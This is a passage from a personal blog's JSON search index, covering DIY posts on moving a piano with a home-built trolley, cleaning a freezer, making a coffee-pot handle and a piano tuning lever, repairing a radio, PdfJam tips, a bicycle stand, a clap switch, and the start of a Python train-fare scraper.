people apparently wondering if it was a bomb. It certainly looks a good deal more impressive, with all the wiring, than it actually is, but I don\u0026rsquo;t mind that.\nIn the end it failed in 2020 and was traced to a dodgy joint and resoldered. Since then it’s been solid as a rock.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nOn reflection it’s probably a ground loop. One of these days\u0026hellip;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://2e0byo.github.io/post/electronics/clocks/networked-alarm-clock/","tags":["Clocks"],"title":"Networked Alarm Clock"},{"categories":["Workbench","Engineering"],"contents":"Moving is not much fun. Moving pianos is even less fun: you have all the difficulty of moving a 300kg object coupled with the worry that you\u0026rsquo;ll twist it out of shape, drop it, strain it, or just shake it too much.\nMoving, however, just round the corner—700yds, according to Google—is at least easier than moving halfway round the world. But moving a piano 700yds is not apparently any easier than moving it 300 miles: you can\u0026rsquo;t wheel it, not on those little coasters, or even on a furniture dolly. And the seven hundred yards in question included one gravel drive, a hundred yards of dodgy pavement, three LVAs and two sharp corners\u0026mdash;and then a lot of road, not to mention steps at the far end. On the other hand, I couldn\u0026rsquo;t find a van for less than £300. Split with my housemate that\u0026rsquo;s £150: surely that money could be spent on something I could keep at the end of the day?\nThus I started thinking about a dolly with wheels big enough to take the curbs, and able to ride smoothly over cracked paving. That meant pneumatic tires and at least 8\u0026quot; wheels. Then there\u0026rsquo;s steering: a furniture dolly is short and fitted with swivel wheels, but the fun is balancing the object. Balancing a piano for 700yds sounds like a good way to drop it. So I thought about two dollys, two-wheeled, bolted to each end of the piano frame. For wheels I imagined children\u0026rsquo;s bike wheels, mounted in a CSL (that 2.5\u0026quot;x1.75\u0026quot; rounded-edge pine one finds everywhere at slightly more than £1/m), with the frame underslung to keep everything low.\nExcept, as I lay awake building it in my head I saw every bump straining the frame of the piano, leaving it permanently sagging. And then the local bike repair shop were dubious about the wheels taking the weight, though they promised to look all the same. And would the CSL frame really be strong enough?\nI had a lot of old shelving: mainly blockboard, some 18mm ply, all pulled from the skip outside Hild Bede (if anyone\u0026rsquo;s in Durham, keep an eye on that skip. What about making the frame out of that? I started looking up those lattice constructions you find in Ikea furniture and discovered the theory of torsion boxes. Now this was how to make the beam! But what about the wheels? Amazon, to my surprise, listed a good number of \u0026lsquo;sack trolley\u0026rsquo; 10\u0026quot; wheels with integrated bearings. Thus it was time to build a model:\nThis is freecad, a wonderful program if you don\u0026rsquo;t mind specifying absolute position manually. But handy for those of us who are uncertain about tolerances and don\u0026rsquo;t like the idea of trying to move the axles afterwards.\nInvention Except this was rather high off the ground. How was the piano to get up there? I visualised lifting each end one by one, adding another block of CSL under each end untill the dollies could be slid underneath. So I tried it, and it worked\u0026mdash;sort of. The piano was very wobbly. And it turned out that the wooden frame was only loadbearing at two attachment points to the iron inner frame, one at each end, and that it had long since sagged in the middle. The uprights to the keyboard are not loadbearing at all. With a dolly on each end the piano was going to be quite unstable, bolted to a wooden frame not designed to take the torsion it would apply as it leaned. Hmm.\nIn the meantime I solved the steering problem. Just bolting through worried me: 150kg—assuming the piano was totally flat—was going to generate an enormous amount of friction. I imagined various plate bearings, generally mylar lubricated with washing up liquid, and wondered about putting rollers or marbles in grooves. Then I discovered flange-mounted ball bearings for assembly lines. The toughest I could find cheaply was only rated at 66.14lb (sic!) or 30.006kg (if we\u0026rsquo;re going to be arbitrarily precise). 10x30kg = 300kg: more than enough for one end of the load. So I designed a second dolly, lower than the first to enable the bearings to ride on a plate from a mylar-faced mdf door. At this point I imagined the weight of the whole thing keeping the dolly together linearly, with steering at the rear applying no force:\nNow we had some dollies, what about the table and chairs I also had to move? Bolting the table to the dollies was a bit extreme, but I had a 4\u0026rsquo;x4\u0026rsquo; offcut of 18mm ply I could screw down and then strap the table on top. At this point I realised I had invented the trolly, which is like a dolly but holds itself together. Now, if only the piano could be put on a trolly and lashed down! Except that would require another dolly, of the standard furniture-moving kind, and a set of ramps.\nBuilding I spent £100 of the £150 on a tracksaw. The bearings were £10, the wheels £20, the m16 studding £4, the washers £5, the nuts £10, the holesaw and arbour another £20, and the screws about £10 in total. Even had I had to buy the timber the whole thing would have come in at around £50.\nFirst thing, in this country, is to have somewhere to work if it rains:\nThen it was just a matter of getting used to the tracksaw:\nUnder the RH edige is a rubber seal: the first cut calibrate this to the precise inner edge.\nAnd then a lot of cutting. Despite no decent bench and minimal tools, these were all done in around an hour with a maximum error of a few millimiters in the spacers (the rest needed no adjustment):\nDrill the axle holes with a 4mm pilot. I\u0026rsquo;m getting better at drilling square: the overall error was easily corrected with a round file.\nConstruction was just glued and screwed. The spacers needed planing before the inside would fit on.\nFit the axles with the help of a file and cut them off in situ:\nThis stuff wears out hacksaw blade in no time. But there was worse to come: if we\u0026rsquo;re going to have a trolley, the rotating axle will transfer horizontal force. And gravity can hardly be depended upon to keep the bearing together, but the mylar-clad plate is not thick enough to recess a full nut in it, and I didn\u0026rsquo;t want anything protruding to get caught. So I cut a nut in half:\nIncidentally, without any spanners large enough to grip these nuts I made a pair out of scrap ply. Inability to tighten this axle properly resulted in having to do it up again every journey. But for now, drill out holes for the bearings:\nAs you can see, they only sent me 9 bearings. But then they refunded half, so I shan\u0026rsquo;t complain. All together and screwed to the ply, whose offcuts make ramps:\nAnd we have a trolley! Now to use it\u0026hellip;\nTesting Here is a trolley, full of books. In total there\u0026rsquo;s about 250kg on there (I did weigh them, but I\u0026rsquo;ve forgotten)—good enough for a test. The 18mm ply is bowing lightly:\nOn the other hand, the beams are not:\nAs you can see, the wheels are not quite running true. Yet the axles are parallel: it turns out that m16 studding is a lousy axle for a pair of 16mm ballraces, which really want a shaft at or slightly over 16mm. As it is, the bearing rotates on the axle as well as the wheel on the bearing. The sound is rather alarming, but there we go. Oh well.\nOn this first trip the recessed-half-nut system failed on arrival. It had been designed under the assumption that the trolley would be pushed and steered separately, and here I was pulling it. So I gave up on having a clear top and replaced the front plate and took the bolt all the way through:\nThe half-nut is now within, holding the axle fast to the top (the whole front bogie rotates against the axle. So far the holes are holding up fine.) whilst clearing the bearings.\nPiano Moving So the trolley could stand the weight: but could we move a piano on it? First to wheel it on with a little dolly I made (not shown):\nThen to chock it up and strap it down. This time we actually did push and hold the piano itself lest it tumble, and the yoke was used only for steering.\nThe wheelbase was chosen to fit on all the paths and align withthresholds\nThen to get it up a set of steps and over a threshold:\n(I\u0026rsquo;m inside lifting the piano!) The small dolly failed on the threshold, but by that point we could wheel the piano on its own castors. The trolley is still fine: I\u0026rsquo;ve since used it around B\u0026amp;Q, with an angled frame to take timber, causing the staff to ask whether it was one of their trollies, and if so where I\u0026rsquo;d found it.\n","permalink":"https://2e0byo.github.io/post/engineering/how-to-move-a-piano/","tags":null,"title":"How to Move a Piano"},{"categories":["Repairs"],"contents":"I arrived back yesterday to discover that the fridge, or more specifically the fridge-freezer, had been off for at least a week.1 The same week, coincidentally, that temperatures in the range of southern France on a cool day have lead to pantograph cables all falling off. Oops. Hopefully the repairs will be more heat-tolerant\u0026hellip; Thus in this heat wave2—well, it was certainly warm—the inside of the fridge/freezer got to goodness knows what temperature (fridges make good beer-brewing ovens, as google will show).\nAnd as to the state of the freezer—well. Once one has bagged all the remains, mopped up everywhere and sanitised the floor, what then? Cleaning everything down and putting the thing back on immediately showed up a problem: it still stank, and the stink was in the air-cooling system. Back in the day freezers had metal piping everywhere attached to a heat exchange on the back. Attached fridges were cooled by blowing air up from the freezer compartment. This worked well, but they keep getting more efficient—so now we have a single cooling array at the top of the freezer with a fan, and, presumably, another for the fridge.3\nAccording to the internet, if one\u0026rsquo;s freezer is the site of meat decay there are two options: a gradated treatment over several weeks of various cleaners and activated carbon or buying a new freezer. Except I don\u0026rsquo;t have several weeks, I have less than 48h. And as for buying a new one; well. Looking through the ‘methods’ shows that they do two things: clean everything in sight as thoroughly as possible, and vaporise something inside to work into anything out of sight. I figured if I took the whole thing apart I could just clean everything by hand and have it done with.\nHere we go. First, take out the draws, trays, etc, and soak them in the bath with washing up liquid (these have already been disinfected). This is a bath: This is a bath. It\u0026#39;s rarely full of freezer.\nThen unscrew everything in sight. The screws were frozen solid and needed the cordless drill.\nOn top is the cooling array. Fan assembly removed.\nI\u0026rsquo;ve taken the fan assembly away. It\u0026rsquo;s in two parts: the fan itself, and a polystyrene-clad tray which fits under the cooler: The fan assembly is simple: take plate out, remove the two vibration-free rubber mounts and the blade, set them in neat bleach to soak. Wipe the motor down (it\u0026rsquo;s probably immersion-proof—after all, this is a freezer—but why risk it?).\nWash plastic parts down with bleach and add to the bath. Now for the tray: it seems the steel (?) plate is held in place with two bends at the front:\nBend those tabs and the whole thing can be removed. Here it is after scrubbing, with the metal tray to the left. Under the tray is the heating element—yes, fridges contain heaters to periodically de-ice the heat exchange. There\u0026rsquo;s another element running around the array itself, in a smaller tube. Also visible is the polystyrene insulation: this stank. According to the internet, there\u0026rsquo;s nothing you can do if anything gets into the insulation. Hmm.\nNow, how does one clean polystyrene? I rubbed down with neat bleach and got all the surface mould off, but that\u0026rsquo;s not doing much. Of course, I could just spray-laquer it or something and try to seal the smell in but (1) I didn\u0026rsquo;t think of it and (2) I\u0026rsquo;m not sure how it would like the heating. Equally, I could make a new one, but that would take at least a day with hot wire and sandpaper to get anything like the original shape. Instead, here it is soaking in an improvised bleach bath, weighed down with two paving bricks:\nWell, we\u0026rsquo;ll see what that does. Meanwhile the drip tray had to be removed and cleaned, and the exit pipe corked and filled with ‘plughole cleaner’:\nThe exif on those pictures is accurate. Time for dinner and bed. In the morning, with great difficulty I took the box of water outside and emptied it (water: 1kgdm^-1; there are a few bucketfuls in there). The polystyrene stank much less. I took it up to the bath and washed it down with detergent. It smelt even less, though that might be the perfume in the detergent. Now, the polystyrene was held to the steel with aluminium tape, which I threw away. Screwfix is just around the corner, and, although it\u0026rsquo;s a Sunday, this ox has fallen into a pit and I\u0026rsquo;m going tomorrow. So a little Sunday shopping and we can start taping it all back together:\nI taped the exit pipe on (which has a loop of heating element to de-ice it), and had to take it all off again. Then back into the plastic, bend the sheet down to fit, then back up to lock (?!) and tape up everything—the less showing, the less smell, right?\nAnd all back into the freezer. Needless to say nothing would quite fit and it was a wrestling match, but eventually:\nShelves, draws back in. Turn on. Leave. Result: the air from the cooling fan definitely doesn\u0026rsquo;t stink any more. The whole thing smells, well, not exactly fragrant, but no worse than a freezer sometimes does. Now to get back to writing.\nSince credit added to the prepayment ‘smart’ meter I\u0026rsquo;m stuck with doesn\u0026rsquo;t go on until you press a button on the meter. What idiot designed that ‘feature’? “It stops, erm, people maliciously paying each other’s bills!”\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nIn fact, the same failure occured over the Christmas holidays, and everything in the freezer was fine. I think the house might have been colder than the freezer normally is\u0026hellip;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nIn fact I think the fridge is purely passively cooled from the freezer.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://2e0byo.github.io/post/repairs/how-to-break-a-freezer/","tags":null,"title":"How To Break a Freezer"},{"categories":["Repairs"],"contents":"One should not over-brew one\u0026rsquo;s coffee. This is a fault (mea culpa) I occasionally commit. One should probably not use one\u0026rsquo;s coffee pot to reheat coffee, and if one does, one should pay some attention to how long it is on for. Else it will boil dry, and then that heat has got to go somewhere… In this case, it went into the handle, the silicone rubber seal between the two sections and the knob. The handle drooped, faded and expired with a great groan. Already it had broken off when the pot hit the floor at a velocity not specified in the design; now its weakened frame gave up the ghost. (Why do they use thermoplastics for these things? Because this aluminium pot cost ~£6. But it came with not only an (ungrammatical) warranty, but also a spare silicone sealing ring and filter! So all is not lost.) Here is the dismembered carcass:\nBelow the remains of the handle is a piece of beech I obtained gratis at the wood-recycling place. And here is an odd and rather eclectic selection of tools:\nI\u0026rsquo;m not sponsored by Magnusson (though I\u0026rsquo;ll happy sign a contract). But apparently all the local tool shops are. The square comes with a worrying sticker saying it is only \u0026lsquo;approximate\u0026rsquo; (!) but is actually fine. First thing is to mark out and cut the block to size so we can work on the inner face, where the handle meets the pot:\nI had to trim around a few holes. Now, the profile at the end is rather complicated, and involved a few blind grooves about 3mm wide and .5\u0026quot; deep. Sensible people—and me if I had access to a workshop—would just laminate up a piece. Instead I decided to see what I could do with a little judicial abuse of a tenon saw. First, two diagnal cuts:\nThen (and there are no picture of this, because I don\u0026rsquo;t want this blog to be censored) the abuse of a 1.5mm drill bit, which eventually broke. Drill square from both corners, parallel holes inwards, then, using the very end of the tenon saw, break out the waste and square it up. That nearly worked. The penknife helped break it out untill it was clear enough to (gasp) mill out square with the 1.5mm drill bit (yes, I know it\u0026rsquo;s not a milling cutter, it\u0026rsquo;ll break\u0026mdash;well it did). And with a little work we have grooves in the right place. The rest is nasty fiddly cutting and filing. Then the grand profile rough cut with the tenon saw:\nAt this point I had the clever idea™ of chopping out the waste with a chisel. Alas my \u0026lsquo;scrap\u0026rsquo; was rather poor, and the end went and split, so here it is gluing up:\nAnother sunny morning, and rather more rough shaping to be done, and then, tediously, filing, filing, sanding:\nI always hated this kind of work at school. Also, I\u0026rsquo;m beginning to think I\u0026rsquo;ve made it far too long. Never mind: now to measure and drill the holes. First is easy, second will be guesswork:\nAs you can see, I missed quite badly. But in the end I didn\u0026rsquo;t have any M4 bolts in the right length, so I drilled it all out to 5mm—there\u0026rsquo;s plenty of metal—and then cut down an M5 bolt to fit. Then, of course, the top shoulders had to pared away with the chisel till the lid opened. And there you have it:\nIt looks, I think, heartily silly. It is also far too large. But it works fine, it cost me nothing (but 5 hours\u0026rsquo; work in the sun\u0026mdash;but I needed a distraction, and the mind can still work). And at least it\u0026rsquo;s a talking point now.\n","permalink":"https://2e0byo.github.io/post/repairs/coffeepot-short-and-stout-heres-my-handle/","tags":null,"title":"CoffeePot, short and stout; here's my handle..."},{"categories":["engineering","workbench"],"contents":"I have a piano to tune. And also to restore: a few hammer shafts to bend, hammers to file, a bit of crud to clean out, bridle straps to replace, etc, etc. The piano cost £40 from Ebay and is in remarkably good nick, and any piano is better than none! But an out of tune piano is no good.\nNow students, I feel, should not really spend money having their pianos tuned\u0026mdash;at least, not students of Theology.1 But who is to say I cannot tune it myself? So I read a few books (I am doing an arts degree after all!) and websites, and it seems a moderately competent person with a tuning meter can expect to do a reasonable job in a day—the kind of job a tuner would do in half an hour. I\u0026rsquo;ll settle for that: it\u0026rsquo;ll make things infintely more playable, and I can\u0026rsquo;t start work regulating an out-of-tune piano. It\u0026rsquo;s just too painful on the ear.\nNow, to tune a piano you need a tuning lever. And unlike harps, or harpsichords, you need a long lever—those strings are under enormous tension, and tuning with a harpsichord tuning key is just not going to work (I tried). Unfortunately, piano tools are woefully expensive, because there aren\u0026rsquo;t enough piano tuners and rebuilders in the world. At this point temptation came into play, and I bought a cheap chinese \u0026lsquo;piano tuning kit\u0026rsquo; off ebay, assuming that rubber wedges (to mute the strings) are just wedges, and surely piano tuning pin sizes are standardised?\nOf course they are! Internally. Every manufacturer seems to have used their own size, and even today there are apparently competing sizes\u0026hellip; and of course, my cheapo lever just spun on the pins. I tried to make a sheet metal insert to decrease the size of the tip: a foolish idea which of course did not work. Then I spent many fruitless hours trying to think of a way to make a new tip for it with only hand tools in a kitchen, and came up with nothing. Theoretically one could drill out a piece of mild steel, file it, polish it smooth, and then harden it. But really, I\u0026rsquo;ve got a degree to do. So I bought the bullet and bought an expensive but very well made tuning lever tip in the same size from Heckscher: in fairness to the company, they\u0026rsquo;re no cheaper anywhere else, there just isn\u0026rsquo;t the market to make them cheaper.\nNow, it would be nice if it just screwed into the M10/1 (fine, 1mm pitch) thread on the chinese lever. But of course it didn\u0026rsquo;t. So I had several options: glue or weld it in place, buy the right lever, or find something with the right thread. The first two options would cost about the same (I don\u0026rsquo;t have a welding machine!), so the third was preferrable. After an enormous amount of head scratching and purchasing a thread gauge I discovered it was a 3/8\u0026quot; 30TPI \u0026lsquo;UNS\u0026rsquo;\u0026mdash;american 60° metric-style threads but with imperial dimensions. And looking at the end of the lever, there might just be enough metal under the thread to file it off and cut another. A die was sourced at very reasonable price from Tracy Tools and I filed off the end:\ncut a new thread:\nand screwed on the tip:\nIt was a bit loose, but tightened up. Of course, on the tuning pegs it just came straight off again, and eventually stripped the very mild steel lever. So back to the workbench, this time to try the silly project of filing a new 3/8\u0026quot; rod from the end. After cutting off the old thread, here it is:\nAnd of course, the die (with plenty of washing up liquid as a threadcutting lubricant, and going slowly!) does a pretty good job of rounding up the metal as it cuts:\nNow that\u0026rsquo;s a lovely thread. The only thing I managed productively that day—there are days like that—but a nice thread. The new shoulder isn\u0026rsquo;t quite flat, but the tip tightened down and stuck on after a little work, and I pulled the five or so notes which sounded out of tune with themselves back into unisons. 2\nIf anyone else is in need of such a tool in similar straits: don\u0026rsquo;t buy a chinese lever, buy a tuning tip and a 3/8\u0026quot; 30TPI die, and then make your own lever—and while you\u0026rsquo;re at it, make it longer than this one. Unless you\u0026rsquo;re lucky enough to have a screwcutting lathe and can just make an adaptor…\nThis conviction has long been abandoned\u0026hellip;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nWhen the tuner got to it a month or so later he was very confused.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://2e0byo.github.io/post/engineering/piano-tuning-lever/","tags":null,"title":"Piano Tuning Lever"},{"categories":["Electronics","Repairs"],"contents":"The radio we use in the kitchen to make washing up bearable stopped working. Specifically, it wouldn\u0026rsquo;t turn on, but the power LED was constantly flashing on and then fading off. What makes me think the power supply might have died? Lo and behold, after purchasing a cheap multimeter (it\u0026rsquo;s incredible how cheaply one can get some things now: in ten years the price of test equipment has plumetted): the \u0026lsquo;8v\u0026rsquo; output was about 3v, and the \u0026lsquo;15v\u0026rsquo; output was 0v. Hmm. Here\u0026rsquo;s the very crude power supply:\nSwitchmode supplies like this one are very simple: on the bottom left the AC enters, is smoothed, and then rectified so it can be chopped up into higher frequency (in the KHz with this one\u0026mdash;you can hear the transformer) PWM, passed through a step-down transformer (much more efficient at higher frequencies) and then rectified and smoothed again at the target voltage. The PWM duty cycle is adjusted to keep the voltage constant. For some reason surface mount components are still quite rare on these boards—there are a few resistors and diodes on the other side, but most things are still through-hole. Normally I\u0026rsquo;d like an oscilloscope to troubleshoot one of these things, but with only a cheap multimeter I probed a bit, and found that the 15v output was shorted to ground (obviously enough it was either shorted or disconnected). The usual culprit is the electolytic smoothing capacitor, so I desoldered it, but it was fine. Looking at the ouput circuitry a little harder, could it be the diode? It showed continuity both ways, and sure enough, with the 15V rectifying diode out of line the the 8V output worked (at 7.6v, but there we go). In the short term I removed the diode and ran the 15V output off the 8V, on the basis that I can\u0026rsquo;t see any use for 15V in a radio except to run the audio power amplifier:\n\u0026hellip;and it powered up, decoded enough DAB and started playing:\nNot bad! A replacement Schottky Barrier Diode cost £0.45 on CPC (it would be less at Farnell proper, I\u0026rsquo;m sure—but my spare parts are at home, not here). So the whole radio, which retailed for a good deal more than the £10 we got it for from BHF I\u0026rsquo;m sure, would probably have been thrown out for a £0.45 diode. When the new one came I installed it and the 15V line came back to life (at 15.7V, so much for regulation).\nI suspect the thing was faulty—the specs allow 150V and 30A breakdown, and I don\u0026rsquo;t see how one could get even close to that. But then, I doubt the switch-on regulation is very well designed. This, incidentally, is why electronics and practical engineering should be taught in schools: it\u0026rsquo;s not only economically and environmentally desirable, it gives one the enjoyment of seeing things come back to life. While I was at it, I blocked the cardboard borts on the speakers, which boom rather a lot: not entirely cured, but a good deal better. I\u0026rsquo;ve no idea why manufacturers over-port their speakers: I\u0026rsquo;d much rather listen to a rather trebly sound than have about a major third resonate and everything else sound oddly distorted. Tidying up I realised that this is rather a good photographic summary of student living:\nStudent Living: books and tools.\n","permalink":"https://2e0byo.github.io/post/repairs/radio-repair/","tags":null,"title":"Radio repair"},{"categories":["Computing"],"contents":"Can we take a moment to remark on how wonderfully useful PdfJam is? Behind the scenes it\u0026rsquo;s just LaTeX. Thus you might be surprised to notice that\npdfnup --nup 1x1 --paper a5paper --no-landscape image.png Is an excellent way to turn an image—say, a bunch of screenshots of a page which you concatenated with\nconvert image1.png image2.png image3.png -append image.png Into (say) an a5 pdf, ready to be turned into a full-length pdf with\npdftk *.pdf cat output out.pdf And then laid up into a booklet with\npdfbook2 out.pdf I\u0026rsquo;ve used pdfbook2 over pdfbook as it adds margins—which normally I don\u0026rsquo;t want, but here it is useful as the nup-d pages probably don\u0026rsquo;t have very large margins. Of course there are various ways of customising it. An even better way of converting pngs of a text document (say, a scan—though beware copyright: you\u0026rsquo;re probably alright for personal use but IANAL) into pdfs is\ntesseract image.png image-ocr -l fra+lat+grc pdf With languages set accordingly, initially in order of provenance. This produces a pdf with \u0026lsquo;invisble\u0026rsquo; ocr-d text you can select and copy-paste, and it\u0026rsquo;s really good. But Tesseract and Scantailor (an excellent program for extracting, sharpening, monotoning and generally adjusting scans) are for another post and another day.\n","permalink":"https://2e0byo.github.io/post/computing/pdfjam-for-more-than-just-pdfs/","tags":null,"title":"PdfJam: for more than just pdfs"},{"categories":["carpentry"],"contents":"After a few months of balancing my bicycle between two walls where once, it would seem, was a pantry, it got too annoying. Ideally one would like some kind of stand to hold the bike out the way, vertically. The internet turns up many such designs. After a trip around the rather poor selection of wood available at B\u0026amp;Q (the only place open), I settled on something slightly different—an L-shaped half-lapped frame with wooden chocks to space it, and the bicycle balanced with just a small inward turning moment counteracted by its own weight.\nAfter thinking about this for a week I decided it would be plenty stable enough without the need to to make it a \u0026lsquo;T\u0026rsquo; or inverted \u0026lsquo;7\u0026rsquo;. Lest I sound entirely stupid, imagine the moment of putting the bike in, where its own weight is supported (and so can\u0026rsquo;t act); the only force acting on the stand is presumably the front wheel pushing it away, and the stand bouncing all the time would be annoying. As it happens I was completely wrong about this assumption, but anyhow.\nFirst off, the half-lap joints: as you can see, the timber I ended up with is about 1/2\u0026quot; wider than the depth of my Tenon saw, so the last 1/2\u0026quot; was taken off rather clumsily with a cross-cut panel saw and then pared down with a chisel:1\nAssemble, true up, glue and temporarily clamp against the try square, and then add two screws to hold the alignment:\n…remove clamp, three more screws and give it all a while to get some handling strength. Meanwhile, the chocks—I eyeballed the chamfer and cut it off rather roughly, but the worst thing was trying to drill square. Years of relying on a pillar drill do not help. Turns out it\u0026rsquo;s mainly about sight-lines: the first block was by far the worst, but after that it went relatively smoothly (these are all from the exit side). [gallery ids=\u0026ldquo;254,255\u0026rdquo; type=\u0026ldquo;rectangular\u0026rdquo;] There are no photos of the highly irritating next stage, but by some juggling I managed to get two chocks bolted through the bottom to line the whole thing up and hold the bottom wheel. At this point I realised that it was too short to put a chock above the top wheel whilst still maintaining balance—I must have slightly mismeasured the balance point. But we don\u0026rsquo;t actually need one there, so I did a rough guess at the top chock position and then drilled a set of parallel holes:\nIncidentally, someone is probably going to point out that I\u0026rsquo;m not drilling into scrap. It\u0026rsquo;s true, and bad\u0026mdash;but I don\u0026rsquo;t have any scrap, the drill bit is sharp, and you can avoid bad breakout damage if you\u0026rsquo;re careful. Here\u0026rsquo;s a shot with the whole thing together:\nWhich was really rather stable. Indoors on the lino it lacked horizontal stability, so I added two stabilising bars from leftover 2\u0026quot; stock (whence the chocks):\nAnd there we have it: not bad for a day\u0026rsquo;s work without access to a proper workshop. In use it takes about 3-4\u0026quot; of movement to generate a turning moment away from the stand, so I added a bungee on top to catch it if someone knocks the bike. And it\u0026rsquo;s much nicer to come home to than wrestling the thing round the corner was before.\nIt could just have been pared. But at the time I didn\u0026rsquo;t have a bench, and was a bit rusty.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://2e0byo.github.io/post/carpentry/bicycle-stand/","tags":null,"title":"Bicycle Stand"},{"categories":["Workbench"],"contents":"One expects a student\u0026rsquo;s life to have a certain ascesis to it. One, for instance, does not buy rings for one\u0026rsquo;s napkin, one makes them. And so I procured some cord (the seller considered me carefully and then said that I had a face which permitted me to indulge in sailing, which in turn justified buying cord to tie knots—‘Sailors fiddle’, she said approvingly; though I cannot play the violin). And I procured a helpful video on the tying of 3-lead 8-bight Turks Heads, because I can never remember any of these fancy knots. Yet being a student is no cause for shoddy workmanship. It seems I cannot recognise cotton, for I tried a butane backsplice. But lo! cotton does not melt. So the question is, how small a sailmaker\u0026rsquo;s whipping can you make?\nThat\u0026rsquo;s pretty small. And here they are:\n","permalink":"https://2e0byo.github.io/post/workbench/napkin-rings/","tags":["Ropework"],"title":"Napkin Rings"},{"categories":["electronics"],"contents":"I\u0026rsquo;ve always thought of those clap-activated switches as a bit of a gimmick\u0026mdash;after all, you can always just move the lightswitch if it\u0026rsquo;s that hard to get at. But currently my mother is hobbling around on crutches, and it suddenly struck me that turning the uplighter on from the doorway would be handy. A rummage through the junkbox found a board—I think from an old washing machine—full of relays, and 5v relays at that, so no need for a voltage multiplier to turn the relay on. I also found an old \u0026lsquo;usb charger\u0026rsquo; rated at 1A 4.2V (?!), which is thankfully enough to turn on the relay.\nLooking over the internet, most people just feed a common-emitter npn with an appropriately biased mic; some use a darlington for more gain. I could just feed this into a 555 bistable and rely on amplitude alone to prevent false triggering, but that seems a little crude; also, the room is used for music lessons, and clapping is not unheard of. It would be better to have some distinctive pattern; after a little thought I came up with the following:\nThe microphone (an electret pulled from something once) is biased by the 1k and parallel 10k resistors: ideal biasing was somewhere between 1k and 5k, and I had no 5K pot. The 10k is logarithmic anyhow, so the adjustment curve is fun. The first two transistors amplify in common-emmitter mode, the second being an easy point to add amplification by biasing the base up with a resistor if needed.\nThis feeds two 555 timers, both in monostable mode. The first (top) generates a 110ms pulse to debounce the input; the second (bottom) generates a pulse between .1 and ~3s for the timeout circuit. Continuing to the right on the top, two flip-flops form a kind of ring counter: the rightmost toggles, driving the relay, after the leftmost has recieved two rising edges (i.e. two claps). The reset circuit is crude: the leftmost flip-flop is reset and the rightmost is set to its current state (i.e. unaffected\u0026mdash;and any momentary glitch ought to be held on by relay which takes a while to turn off anyhow). To ensure that the leftmost doesn\u0026rsquo;t toggle the rightmost when it resets I added a 10nf capacitor on the base of the transistor (which takes a moment to charge, thus adding a slight delay—or you can say it\u0026rsquo;s a low-pass filter and curves the sharp rising edge). These are both fed from the lower 555, inverted, via a 22uF capacitor to generate a short-ish pulse (about 10ms)—the inversion being so that the pulse comes at the end of the reset window.\nNot shown are most of the decoupling capacitors, which turned out to be essential to stop the flip-flops going mad, the protection diode across the relay coil (otherwise it never turns off!); the hefty (22uF) electrolytic near the transistors (top left) stops them putting enough load on the supply to cause a loud clap to register as two, or even more: this puzzled me for a while until I thought of it.\nMost useful of all is the LED on Q of the first flip-flop, which turns on during the low window (F1 in the timing diagram). Without this, use is highly frustrating. With the LED you adjust the threshold pot until it turns on when you clap (taking care to give it some margin—the supply drifts, and as the relay makes some noise turning off it can go into oscillation, which is not good), and then adjust the \u0026lsquo;window\u0026rsquo; pot, watching the LED. It will turn off by itself under the reset timeout, and the game is to set a long enough timeout to be able to turn the LED off—and the output on—first. Here\u0026rsquo;s the two pots:\nI should probably put knobs on them. But this is not for long term usage (after all, it\u0026rsquo;s drawing current to turn on). Here\u0026rsquo;s the breadboard, a bit of the insulating hardboard added:\nA closeup of the board (rather cramped) and the mains enclosure, safe if not pretty:\nBoard\nMains circuitry to the left\nAnd it works! Not bad for an evening\u0026rsquo;s inspiration. At some point I might even add a video or something to prove it. And if anyone else does this—unless like me you have a lot of random parts around, save yourself the hassle and use a microprocessor, or maybe even dsp on a computer.\n","permalink":"https://2e0byo.github.io/post/electronics/clap-clap-switch/","tags":null,"title":"Clap-clap switch"},{"categories":["Coding"],"contents":"On a rainy day here I wondered exactly when I should book a ticket up to Durham for another term. Most of the booking websites will help you, but not much: it\u0026rsquo;s tiresome to check a few days to see what the price variation is—and it can be fairly enormous. I was also curious as to what the long term trends might be: they don\u0026rsquo;t just seem to go down. All of which suggested some code to screenscrape all the tickets from somewhere and analyse them. It seems the national rail website encodes the query straight into the url (though not as an http query) and then sticks the results, in json, in the page served, presumably for some javascript to parse later. So all we need is to generate the url:\ndef generate_url(depart, destination, when, departing=True): \u0026#34;\u0026#34;\u0026#34;Generate a url to search nationalrail\u0026#39;s database with. Parameters are: * depart: 3-letter station departure code * destination : 3-letter station arrival code * when: datetime.datetime object for departure date/time \u0026#34;\u0026#34;\u0026#34; if departing is True: da = \u0026#34;dep\u0026#34; else: da = \u0026#34;arr\u0026#34; url = \u0026#34;http://ojp.nationalrail.co.uk/service/timesandfares/%s/%s/%s/%s/%s\u0026#34; % ( depart, destination, when.strftime(\u0026#34;%d%m%y\u0026#34;), when.strftime(\u0026#34;%H%M\u0026#34;), da) return (url) And then parse it. I\u0026rsquo;d never done a parser before, but BeautifulSoup makes it easy enough:\nfor i in soup.find_all(\u0026#39;td\u0026#39;, class_=\u0026#39;fare\u0026#39;): i = i.script.contents[0] data = json.loads(i.strip()) Where \u0026lsquo;soup\u0026rsquo; is a BeautifulSoup.parser() instance we\u0026rsquo;ve fed the downloaded html into. The class for the table elements is clear enough from reading the downloaded html. Then we do some (not brilliantly elegant) munging of the data to generate an OrderedDict by day of OrderedDicts of all of the trains for that day. I\u0026rsquo;m only an occasional coder and tend to reinvent the wheel, as the code probably shows. But it works as expected (until the website changes).\nParallel and Queueing Maybe it\u0026rsquo;s just the internet here, but downloading is slow. So slow I envisaged keeping a database and comparing randomly selected trains to see if the online data had changed, and only then re-profiling. Then I thought of doing it in parallel, and had a look at a few tutorials. It seems that real coders know a lot about queueing (or queuing, I can\u0026rsquo;t decide), and that my first idea—hard-code four different worker functions, divide the days up between them, and then have them run until finished, and then order the results—was really too much like silliness, merely because I\u0026rsquo;ve never written a class before. So here is my first OOP, loosely modified from someone\u0026rsquo;s example code:\nclass ThreadProfileTrains(threading.Thread): def __init__(self, train_queue): threading.Thread.__init__(self) self.train_queue = train_queue # print some stuff to stay we started 